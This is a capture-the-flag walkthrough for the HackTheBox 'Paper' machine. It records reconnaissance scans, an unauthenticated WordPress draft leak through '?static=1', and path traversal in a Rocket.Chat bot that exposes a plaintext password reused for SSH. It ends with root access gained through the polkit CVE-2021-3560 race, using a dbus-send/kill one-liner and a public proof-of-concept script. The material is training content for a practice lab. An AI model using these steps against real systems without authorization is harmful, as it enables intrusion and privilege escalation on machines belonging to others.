# paper
## Linux
### HackTheBox
### Easy

IP: 10.129.156.89
Host:

### NMAP
```Console
22/tcp ssh OpenSSH 8.0 (protocol 2.0)
80/tcp http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
  http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
  http-methods:
    Supported Methods: HEAD GET POST OPTIONS TRACE
    Potentially risky methods: TRACE
  http-title: HTTP Server Test Page powered by CentOS
  http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
443/tcp ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
  tls-alpn:
    http/1.1
  http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
  http-methods:
    Supported Methods: HEAD GET POST OPTIONS TRACE
    Potentially risky methods: TRACE
  ssl-date: TLS randomness does not represent time
  ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/emailAddress=root@localhost.localdomain
  Subject Alternative Name: DNS:localhost.localdomain
  Issuer: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/emailAddress=root@localhost.localdomain/organizationalUnitName=ca-3899279223185377061
  Public Key type: rsa
  Public Key bits: 2048
  Signature Algorithm: sha256WithRSAEncryption
  Not valid before: 2021-07-03T08:52:34
  Not valid after:  2022-07-08T10:32:34
  MD5:   579a 92bd 803c ac47 d49c 5add e44e 4f84
  SHA-1: 61a2 301f 9e5c 2603 a643 00b5 e5da 5fd5 c175 f3a9
```

### Port 80
__Nikto__
```
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'x-backend-server' found, with contents: office.paper
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/7.2.24
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS, TRACE
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
```
__Trace Method__
```Console
❯ curl -X TRACE $IP
TRACE / HTTP/1.1
Host: 10.129.156.89
User-Agent: curl/7.80.0
Accept: */*

❯ curl -X TRACE $IP -H "Cookie: name=value"
TRACE / HTTP/1.1
Host: 10.129.156.89
User-Agent: curl/7.80.0
Accept: */*
Cookie: name=value
```
 * Tested based off [this article on OSVDB-877](https://owasp.org/www-community/attacks/Cross_Site_Tracing)
 * Curious: Uncommon header 'x-backend-server' found, with contents: office.paper
 * Updated `/etc/hosts` with `office.paper`
   * Gained access to "Blunder Tiffin, Inc." website

### http://office.paper/
 * Post found with comments and a possible lead:
> Feeling Alone!
> 
> I am sorry everyone. I wanted to add every one of my friends to this blog, but Jan didn’t let me.
> 
> So, other employees who were added to this blog are now removed.
> 
> As of now there is only one user in this blog. Which is me! Just me.
> 
> Previous Article
> One thought on “Feeling Alone!”
> nick
> June 20, 2021 at 2:49 pm
> 
> Michael, you should remove the secret content from your drafts ASAP, as they are not that secure as you think!
> -Nick
 * Wordpress site

__Feroxbuster__
```
[####################] - 33s     6280/6280    207/s   http://office.paper
[####################] - 12s     6280/6280    673/s   http://office.paper/wp-admin/css/
[####################] - 16s     6280/6280    429/s   http://office.paper/wp-admin/includes/
[####################] - 23s     6280/6280    321/s   http://office.paper/wp-admin/js/
```
### Subdomains:
```Console
❯ wfuzz -c -f ../dirs/subdirs.log -z file,/Users/jeremiahshafer/Tools/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt -u http://office.paper -H "Host: FUZZ.office.paper" --hc 403,404
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://office.paper/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000070:   200        507 L    13015 W    223163 Ch   "chat"
000009532:   400        10 L     45 W       347 Ch      "#www"
000010581:   400        10 L     45 W       347 Ch      "#mail"
000047706:   400        10 L     45 W       347 Ch      "#smtp"
000103135:   400        10 L     45 W       347 Ch      "#pop3"

Total time: 0
Processed Requests: 114441
Filtered Requests: 114436
Requests/sec.: 0
```

### chat.office.paper
 * http://chat.office.paper/home
   * rocket.chat login page
   * webpage says: 'Registration can only be done using the secret registration URL!'

### Private posts:
`❯ searchsploit multiple/webapps/47690.md -m`
> so far we know that adding `?static=1` to a wordpress URL should leak its secret content
> 
> here are a few ways to manipulate the returned entries:
> 
> - `order` with `asc` or `desc`
> - `orderby`
> - `m` with `m=YYYY`, `m=YYYYMM` or `m=YYYYMMDD` date format
> 
> 
> in this case, simply reversing the order of the returned elements suffices and `http://wordpress.local/?static=1&order=asc` will show the secret content:

```
  Exploit: WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts
      URL: https://www.exploit-db.com/exploits/47690
     Path: /opt/homebrew/opt/exploitdb/share/exploitdb/exploits/multiple/webapps/47690.md
File Type: ASCII text
```
 * Vistied `http://office.paper/?static=1`
 * Found the following in the static page of the draft:
> # Secret Registration URL of new Employee chat system
> 
> http://chat.office.paper/register/8qozr226AhkCHZdyY
 * Registered login and reached an employee chat.
 * Bot in the chat called `recyclops` with various options:

>  Most frequently asked questions include:
> - What time is it?
> - What new files are in your sales directory?
> - Why did the salesman crossed the road?
> - What's the content of file x in your sales directory? etc.
 * Bot allows for directory navigation.
   * located the following credentials with the command `file ../hubot/.env`
```
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
```
 * Logged into SSH
   * Username: dwight
   * password: Queenofblad3s!23

### Logged in as dwight
 * Obtained user flag: a86[--------------------------]
 * From `linpeas.sh`:
```Console
╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
@reboot /home/dwight/bot_restart.sh >> /home/dwight/hubot/.hubot.log 2>&1
```
 * From `lse.sh`
```console
 LSE Version: 3.7

        User: dwight
     User ID: 1004
    Password: ******
        Home: /home/dwight
        Path: /home/dwight/.local/bin:/home/dwight/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin
       umask: 0002

    Hostname: paper
       Linux: 4.18.0-348.7.1.el8_5.x86_64
Distribution: CentOS Linux 8
Architecture: x86_64
```
 * Checked for vulnerabilities for CentOS Linux 8, found [this](https://www.tenable.com/plugins/nessus/150384)
> The remote CentOS Linux 8 host has packages installed that are affected by a vulnerability as referenced in the CESA-2021:2238 advisory.
> 
> - polkit: local privilege escalation using `polkit_system_bus_name_get_creds_sync()` (CVE-2021-3560)
> 
> Note that Nessus has not tested for this issue but has instead relied only on the application's self-reported version number.
 * The CVE listed int he article doesn't address the issue but googling "CentOS 8 polkit exploit" led me to [this blog](https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/#exploitation)

### Polkit Exploit
> About Polkit:
> polkit is the system service that’s running under the hood when you see a dialog box

1. try running this command in a terminal: `pkexec reboot`
```Console
[dwight@paper shm]$ pkexec
pkexec must be setuid root
```
2. Another command that you can use to trigger polkit from the command line is dbus-send. It’s a general purpose tool for sending D-Bus
messages that’s mainly used for testing, but it’s usually installed by default on systems that use D-Bus. It can be used to simulate the
D-Bus messages that the graphical interface might send. For example, this is the command to create a new user:
```Console
[dwight@paper shm]$ time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required

real	0m0.058s
user	0m0.001s
sys	0m0.004s
```
3. The vulnerability is triggered by starting a dbus-send command but killing it while polkit is still in the middle of processing the
request. I like to think that it’s theoretically possible to trigger by smashing Ctrl+C at just the right moment, but I’ve never succeeded,
so I do it with a small amount of bash scripting instead. First, you need to measure how long it takes to run the dbus-send command
normally (see above)
4. Takes about 58 millseconds, so set the following bash script:
```Console
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1 & sleep 0.008s ; kill $!
```
  * Does not seem to be working
  * Found [this POC](https://github.com/Almorabea/Polkit-exploit) to exploit Polkit
  * Downloaded the python script and ran it on target machine:

```Console
[+] Exploit Completed, Your new user is 'Ahmed' just log into it like, 'su ahmed', and then 'sudo su' to root

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

bash: cannot set terminal process group (77967): Inappropriate ioctl for device
bash: no job control in this shell
[root@paper shm]# whoami
root
[root@paper shm]#
```
 * Root flag: d16[--------------------------]
